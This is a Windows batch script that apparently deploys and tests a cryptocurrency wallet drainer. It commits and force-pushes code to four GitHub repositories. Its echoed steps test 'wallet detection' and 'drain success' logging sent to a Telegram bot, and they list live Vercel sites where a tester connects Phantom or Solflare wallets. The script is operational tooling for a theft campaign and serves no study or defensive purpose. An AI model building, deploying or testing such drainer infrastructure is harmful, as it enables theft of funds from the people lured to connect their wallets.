@echo off
echo Changing to correct directory...
cd /d "C:\Users\popsl\Downloads\Emi-lokan-main"
echo.
echo Current directory:
cd
echo.
echo Checking if this is a git repository...
if not exist ".git" (
    echo ERROR: Not in a git repository!
    echo Please run this script from the Emi-lokan-main directory.
    pause
    exit /b 1
)
echo Git repository found!
echo.
echo Testing Telegram logging functionality...
echo.
echo Checking Telegram configuration...
echo - TELEGRAM_BOT_TOKEN: %TELEGRAM_BOT_TOKEN%
echo - TELEGRAM_CHAT_ID: %TELEGRAM_CHAT_ID%
echo.
echo Testing wallet detection logging...
echo - This will test if wallet names are being detected properly
echo - This will test if drain success is being logged
echo - This will test if transaction cancellation is being logged
echo.
echo Committing test changes...
git add .
git commit -m "TEST: Telegram logging functionality - wallet detection and drain success"
echo.
echo Checking current branch...
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
echo Current branch: %CURRENT_BRANCH%
echo.
echo Pushing test to all repositories...
echo.
echo Pushing to MISUSE repository...
git remote add misuse https://github.com/SacredPath/MISUSE.git
git fetch misuse
git push misuse %CURRENT_BRANCH%:main --force
git remote remove misuse
echo.
echo Pushing to XENA repository...
git remote add xena https://github.com/SacredPath/XENA.git
git fetch xena
git push xena %CURRENT_BRANCH%:main --force
git remote remove xena
echo.
echo Pushing to Mambo repository...
git remote add mambo https://github.com/SacredPath/Mambo.git
git fetch mambo
git push mambo %CURRENT_BRANCH%:main --force
git remote remove mambo
echo.
echo Pushing to Uranus repository...
git remote add uranus https://github.com/SacredPath/Uranus.git
git fetch uranus
git push uranus %CURRENT_BRANCH%:main --force
git remote remove uranus
echo.
echo Done! Test pushed to all repositories.
echo.
echo To test wallet detection:
echo 1. Visit any of the deployed sites
echo 2. Connect a wallet (Phantom, Solflare, etc.)
echo 3. Check Telegram for wallet detection message
echo 4. Complete or cancel a transaction
echo 5. Check Telegram for success/failure/cancellation messages
echo.
echo Test sites:
echo - MISUSE: https://misuse.vercel.app
echo - XENA: https://xena-brown.vercel.app
echo - Mambo: https://mambo-azure.vercel.app
pause
